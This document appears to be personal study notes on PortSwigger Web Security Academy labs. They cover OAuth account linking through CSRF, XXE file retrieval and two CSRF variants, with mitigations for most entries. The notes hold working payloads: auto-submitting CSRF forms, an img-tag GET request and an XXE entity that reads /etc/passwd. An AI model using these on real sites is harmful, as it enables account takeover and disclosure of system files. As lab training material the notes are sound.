
### Lab: <LAB-NAME-HERE>

**Target**

**Vulnerability**

**Exploitation**

**Mitigation**

### Lab: Forced OAuth profile linking

**Vulnerability**

Vulnerable component: `OAuth client application`

Exploitation technique: CSRF against `OAuth client application`

Impact: `OAuth client application` account takeover

Implementation issue in OAuth client application. The application does not contain proper `nonce` parameter during `authorization request` making OAuth flow vulnerable to CSRF attack. Successful exploitation of the flaw allows to associate attacker's controlled account on the identity provider with a victim's account on OAuth client application resulting in an account takeover.

**Exploitation**

1. An attacker initiates OpenID Connect flow on OAuth client application (blog).
2. Halt the flow (from [1]) just before OAuth service redirects the browser back to OAuth client application `redirect_uri`.
3. Prepare CSRF bait site with the following content (where `CODE` value is taken from the response from [2]:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://aca71f891eeb2a5bc1beada2008700a3.web-security-academy.net/oauth-linking">
      <input type="hidden" name="code" value="CODE" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

4. Trick the victim to vist the prepared site.

**Mitigation**

Implement and properly handle state (`nonce`) during OAuth `authorization request`:

    GET /authz?client_id=ID&response_type=CODE&scope=SCOPE&redirect_uri=REDIRECT_URI&state=NONCE


### Lab: Authentication bypass via OAuth implicit flow

### Lab: OAuth account hijacking via redirect_uri

### Lab: Exploiting XXE using external entities to retrieve files

    https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

**Vulnerability**

**Exploitation**

Payload:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```


**Mitigation**

### Lab: CSRF vulnerability with no defenses

**Target**

   https://portswigger.net/web-security/csrf/lab-no-defenses

**Vulnerability**

Plain CSRF vulnerability. When you see a site with cookie-based sessions and there is no CSRF tokens used the good chances are the site is vulnerable.

**Exploitation**

1. Prepare CSRF bait site with the following content:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://accd1ff41f28b885c0cf05e5005a00b1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abc&#64;xyz&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

2. Trick a victim to vist the prepared site.

**Mitigation**

Use anti CSRF mechanism offered by the web framework you're using. Alternatively, implement robust anti CSRF mechanism (e.g. CSRF tokens) by your own.

### Lab: CSRF where token validation depends on request method

**Target**

   https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method

**Vulnerability**

An example of badly implemented anti CSRF mechanism. CSRF token is in place but it is only verified by the application on POST method processing. The application allows GETs as an alternative and does not verifies CSRF token while processing it.

**Exploitation**

1. Prepare CSRF bait site with the following content:

   <img src="https://ac721fed1e1e6c0bc062176100e300f5.web-security-academy.net/my-account/change-email?email=abc5%40xyz.com">

2. Trick a victim to vist the prepared site.

**Mitigation**

Make sure to always verify the existance and freshness of CSRF token.
